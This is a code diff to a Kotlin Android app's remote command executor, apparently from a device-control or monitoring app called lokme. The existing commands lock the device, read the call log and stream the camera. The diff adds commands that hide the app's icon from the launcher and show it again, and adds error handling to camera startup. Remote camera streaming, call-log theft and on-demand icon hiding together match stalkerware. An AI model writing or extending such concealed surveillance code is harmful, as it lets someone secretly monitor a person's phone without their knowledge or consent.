@@ -1,7 +1,9 @@
 package com.lokme.service
 
 import android.app.AlertDialog
+import android.content.ComponentName
 import android.content.Context
+import android.content.pm.PackageManager
 import android.os.Handler
 import android.os.Looper
 import android.util.Log
@@ -26,17 +28,25 @@ class CommandExecutor(private val context: Context) {
         private set
 
     fun initCamera(lifecycleOwner: androidx.lifecycle.LifecycleOwner) {
-        Thread {
-            val helper = CameraHelper(context, lifecycleOwner)
-            helper.initialize()
-            cameraHelper = helper
+        try {
+            Thread {
+                try {
+                    val helper = CameraHelper(context, lifecycleOwner)
+                    helper.initialize()
+                    cameraHelper = helper
 
-            val streamHelper = VideoStreamHelper(context, lifecycleOwner)
-            streamHelper.initialize()
-            videoStreamHelper = streamHelper
+                    val streamHelper = VideoStreamHelper(context, lifecycleOwner)
+                    streamHelper.initialize()
+                    videoStreamHelper = streamHelper
 
-            Log.d("CommandExec", "Camera + VideoStream initialized")
-        }.start()
+                    Log.d("CommandExec", "Camera + VideoStream initialized")
+                } catch (e: Exception) {
+                    Log.e("CommandExec", "Camera init failed: ${e.message}")
+                }
+            }.start()
+        } catch (e: Exception) {
+            Log.e("CommandExec", "initCamera error: ${e.message}")
+        }
     }
 
     fun execute(
@@ -58,13 +68,15 @@ class CommandExecutor(private val context: Context) {
             "GET_CALL_LOG" -> getCallLog(commandId, deviceId, onSuccess, onError)
             "START_VIDEO_STREAM" -> startVideoStream(commandId, deviceId, payload, wsClient, onSuccess, onError)
             "STOP_VIDEO_STREAM" -> stopVideoStream(commandId, deviceId, onSuccess, onError)
+            "HIDE_APP" -> hideApp(commandId, deviceId, onSuccess, onError)
+            "SHOW_APP" -> showApp(commandId, deviceId, onSuccess, onError)
             else -> onError("Unknown command: $commandType")
         }
     }
 
     private fun lockDevice(commandId: String, deviceId: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
         try {
-            val adminComponent = android.content.ComponentName(context, DeviceAdminReceiver::class.java)
+            val adminComponent = ComponentName(context, DeviceAdminReceiver::class.java)
             val dpm = context.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
 
             if (dpm.isAdminActive(adminComponent)) {
@@ -95,7 +107,9 @@ class CommandExecutor(private val context: Context) {
                     val dialog = builder.create()
                     dialog.window?.setType(android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY)
                     dialog.show()
-                } catch (_: Exception) {}
+                } catch (e: Exception) {
+                    Log.e("CommandExec", "Dialog show error: ${e.message}")
+                }
             }
 
             onSuccess("Dialog shown")
@@ -177,6 +191,36 @@ class CommandExecutor(private val context: Context) {
 
         helper.stopStream()
         onSuccess("Video stream stopped")
+    }
+
+    private fun hideApp(commandId: String, deviceId: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
+        try {
+            val pm = context.packageManager
+            val componentName = ComponentName(context, "com.lokme.MainActivity")
+            pm.setComponentEnabledSetting(
+                componentName,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+            onSuccess("App hidden from launcher")
+        } catch (e: Exception) {
+            onError(e.message ?: "Hide failed")
+        }
+    }
+
+    private fun showApp(commandId: String, deviceId: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
+        try {
+            val pm = context.packageManager
+            val componentName = ComponentName(context, "com.lokme.MainActivity")
+            pm.setComponentEnabledSetting(
+                componentName,
+                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                PackageManager.DONT_KILL_APP
+            )
+            onSuccess("App shown in launcher")
+        } catch (e: Exception) {
+            onError(e.message ?: "Show failed")
+        }
     }
 
     private fun getCallLog(commandId: String, deviceId: String, onSuccess: (String) -> Unit, onError: (String) -> Unit) {
